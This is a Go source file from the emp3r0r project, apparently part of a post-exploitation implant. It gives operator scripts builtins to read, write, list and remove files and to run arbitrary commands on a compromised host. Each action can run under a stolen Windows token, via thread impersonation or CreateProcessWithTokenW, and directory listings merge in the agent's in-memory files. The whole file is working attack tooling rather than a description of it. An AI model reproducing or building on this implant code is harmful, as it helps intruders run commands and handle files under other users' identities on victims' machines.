package script

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"go.starlark.net/starlark"
)

// ExecWithToken is an optional hook that, when set on Windows, uses
// CreateProcessWithTokenW so the child process runs under the impersonation
// token instead of the primary process token.
var ExecWithToken func(token uintptr, commandLine string) error

// ImpersonateFn is an optional hook that locks the calling goroutine to its
// OS thread and impersonates the given token via NtSetInformationThread.
// RevertFn must be called (deferred) to restore the previous identity.
// Set by the modules package on Windows; nil on other platforms.
var ImpersonateFn func(token uintptr) error

// RevertFn reverts the thread token and unlocks the OS thread.
// Must be paired with a preceding ImpersonateFn call.
var RevertFn func()

// runWithToken executes fn under the impersonation token stored in the
// starlark thread, if any. It locks the OS thread, impersonates, calls fn,
// reverts, and unlocks — all transparently.
//
// When no token is set (or the platform doesn't support impersonation)
// this is a no-op that simply calls fn().
func runWithToken(thread *starlark.Thread, fn func() error) error {
	tokenVal := thread.Local("token")
	if tokenVal == nil || ImpersonateFn == nil {
		return fn()
	}
	token, ok := tokenVal.(uintptr)
	if !ok || token == 0 {
		return fn()
	}
	if err := ImpersonateFn(token); err != nil {
		return fmt.Errorf("impersonate: %w", err)
	}
	defer RevertFn()
	return fn()
}

func starlarkReadFile(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}
	var content []byte
	err := runWithToken(thread, func() error {
		var e error
		content, e = util.ReadFileAgent(path)
		return e
	})
	if err != nil {
		return starlark.None, fmt.Errorf("read_file %s: %w", path, err)
	}
	return starlark.String(string(content)), nil
}

func starlarkWriteFile(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	var content string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path, "content", &content); err != nil {
		return starlark.None, err
	}
	err := runWithToken(thread, func() error {
		return util.WriteFileAgent(path, []byte(content), 0o644)
	})
	if err != nil {
		return starlark.None, fmt.Errorf("write_file %s: %w", path, err)
	}
	return starlark.None, nil
}

func starlarkListDir(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}

	namesMap := make(map[string]bool)
	list := starlark.NewList(nil)

	// Read disk directory under impersonation (if token set).
	if err := runWithToken(thread, func() error {
		diskEntries, err := os.ReadDir(path)
		if err != nil {
			return nil // ignore disk errors; memory files may still be visible
		}
		for _, entry := range diskEntries {
			name := entry.Name()
			if !namesMap[name] {
				namesMap[name] = true
				list.Append(starlark.String(name))
			}
		}
		return nil
	}); err != nil {
		thread.Print(thread, fmt.Sprintf("list_dir: impersonation failed, reading as process identity: %v", err))
		diskEntries, _ := os.ReadDir(path)
		for _, entry := range diskEntries {
			name := entry.Name()
			if !namesMap[name] {
				namesMap[name] = true
				list.Append(starlark.String(name))
			}
		}
	}

	// Clean target path for memory file comparison
	absPath, err := filepath.Abs(path)
	if err != nil {
		absPath = filepath.Clean(path)
	}

	// Retrieve all memory file keys directly from the exported MemFileMap map under lock
	util.MemFileLock.RLock()
	var memFiles []string
	for k := range util.MemFileMap {
		memFiles = append(memFiles, k)
	}
	util.MemFileLock.RUnlock()

	// Merge memory files residing in the target directory
	for _, memFile := range memFiles {
		absMemFile, err := filepath.Abs(memFile)
		if err != nil {
			absMemFile = filepath.Clean(memFile)
		}
		if filepath.Dir(absMemFile) == absPath {
			name := filepath.Base(absMemFile)
			if !namesMap[name] {
				namesMap[name] = true
				list.Append(starlark.String(name))
			}
		}
	}

	return list, nil
}

func starlarkExists(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}
	var exists bool
	if err := runWithToken(thread, func() error {
		exists = util.IsExist(path)
		return nil
	}); err != nil {
		thread.Print(thread, fmt.Sprintf("exists: impersonation failed: %v", err))
		exists = util.IsExist(path)
	}
	return starlark.Bool(exists), nil
}

func starlarkMkdir(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}
	err := runWithToken(thread, func() error {
		return os.MkdirAll(path, 0o755)
	})
	if err != nil {
		return starlark.None, fmt.Errorf("mkdir %s: %w", path, err)
	}
	return starlark.None, nil
}

func starlarkRemove(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var path string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path); err != nil {
		return starlark.None, err
	}
	err := runWithToken(thread, func() error {
		return util.RemoveFileAgent(path)
	})
	if err != nil {
		return starlark.None, fmt.Errorf("remove %s: %w", path, err)
	}
	return starlark.None, nil
}

func starlarkExecCmd(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var command string
	var cmdArgs *starlark.List
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "cmd", &command, "args?", &cmdArgs); err != nil {
		return starlark.None, err
	}
	var goArgs []string
	if cmdArgs != nil {
		for i := 0; i < cmdArgs.Len(); i++ {
			v := cmdArgs.Index(i)
			s, ok := starlark.AsString(v)
			if !ok {
				return starlark.None, fmt.Errorf("exec_cmd argument at index %d is not a string", i)
			}
			goArgs = append(goArgs, s)
		}
	}

	// If a token is set (ExecuteAsToken is active), use CreateProcessWithTokenW
	// so the child process runs as the impersonated user.
	if tokenVal := thread.Local("token"); tokenVal != nil {
		if token, ok := tokenVal.(uintptr); ok && token != 0 && ExecWithToken != nil {
			cmdLine := command
			if len(goArgs) > 0 {
				cmdLine += " " + strings.Join(goArgs, " ")
			}
			if err := ExecWithToken(token, cmdLine); err != nil {
				return starlark.None, fmt.Errorf("exec_cmd with token: %w", err)
			}
			return starlark.String("started (token)"), nil
		}
	}

	c := exec.Command(command, goArgs...)
	out, err := c.CombinedOutput()
	if err != nil {
		return starlark.String(string(out)), fmt.Errorf("exec_cmd %s: %w (output: %s)", command, err, string(out))
	}
	return starlark.String(string(out)), nil
}
